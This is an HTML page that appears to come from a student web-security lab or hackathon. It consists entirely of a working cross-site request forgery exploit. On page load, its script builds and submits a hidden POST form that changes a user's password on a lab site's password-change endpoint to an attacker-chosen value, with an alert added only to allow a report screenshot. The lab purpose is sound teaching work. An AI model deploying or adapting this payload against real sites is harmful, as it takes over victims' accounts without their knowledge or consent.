<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Individual Project 2</title>
</head>
<body>

<script>
    function CSRF(){
        // create a form element
        var form = document.createElement('form');
        // construct the form
        form.action = "https://sohan.waph.io/form2.php";
        form.method = 'POST'; // Change method to POST
        form.target = '_self';
        form.enctype="multipart/form-data"
        // add inputs to the form
        form.innerHTML = '<input type="password" name="newpassword" value="UCIT@hacked1">' +
                         '<input type="submit" name="Change password">';
        // append the form to the current page
        document.body.appendChild(form);
        // just for the lab report to capture the screenshot, otherwise, the CSRF
        // will be submitted automatically
        alert('CSRF attack for hackathon 4 is about to happen - By Sohan Chidvilas Bodapati');
        // Submit the form
        form.submit();
    }

    // call CSRF() to forge an HTTP POST request to the vulnerable application
    CSRF();
</script>

</body>
</html>
